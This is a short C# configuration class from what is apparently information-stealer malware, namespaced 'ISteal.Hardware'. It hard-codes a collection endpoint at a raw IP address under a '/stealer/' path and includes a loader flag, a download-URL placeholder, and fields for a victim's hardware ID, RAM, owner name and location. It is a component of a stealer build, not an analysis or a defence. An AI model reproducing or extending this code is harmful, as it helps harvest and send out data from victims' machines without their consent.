namespace ISteal.Hardware
{
    internal class RawSettings
    {
        //public static string Owner;
       // public static string Version;
        public static readonly string SiteUrl = "http://93.170.123.78/stealer/";
       // public static string HWID;
       // public static string RAM;
       // public static string Location;
        public static string Downloadurl = "[url]";
        public static bool OnLoader = false;

        public RawSettings() { }

        public static object Owner { get; internal set; }
        public static object Version { get; internal set; }
        public static object HWID { get; internal set; }
        public static object RAM { get; internal set; }
        public static object Location { get; internal set; }
    }
}